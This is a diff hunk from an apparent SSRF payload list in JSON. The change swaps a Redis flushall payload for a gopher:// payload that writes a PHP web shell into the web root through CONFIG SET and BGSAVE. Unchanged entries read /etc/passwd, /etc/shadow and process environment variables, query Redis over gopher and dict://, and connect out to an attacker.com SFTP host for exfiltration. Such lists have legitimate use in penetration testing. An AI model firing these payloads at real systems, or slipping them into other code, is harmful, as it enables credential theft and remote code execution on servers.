@@ -47,7 +47,7 @@
         {"payload": "file:///etc/passwd", "description": "Local file read via file:// scheme", "waf_bypass": false},
         {"payload": "file:///etc/shadow", "description": "Shadow file read via file:// scheme", "waf_bypass": false},
         {"payload": "file:///proc/self/environ", "description": "Process environment variables via /proc", "waf_bypass": false},
-        {"payload": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a", "description": "Gopher protocol to Redis flushall", "waf_bypass": false},
+        {"payload": "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSET%20x%20%22%3C%3Fphp%20system%28%24_GET%5B0%5D%29%3B%20%3F%3E%22%0d%0aBGSAVE%0d%0a", "description": "Gopher Redis RCE — CONFIG SET to write PHP shell via BGSAVE", "waf_bypass": false},
         {"payload": "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$10%0d%0ahelloworld%0d%0a", "description": "Gopher protocol to Redis SET command", "waf_bypass": false},
         {"payload": "dict://127.0.0.1:6379/info", "description": "dict:// protocol to Redis INFO", "waf_bypass": false},
         {"payload": "sftp://attacker.com:2222/", "description": "SFTP scheme to exfiltrate via outbound connection", "waf_bypass": false},
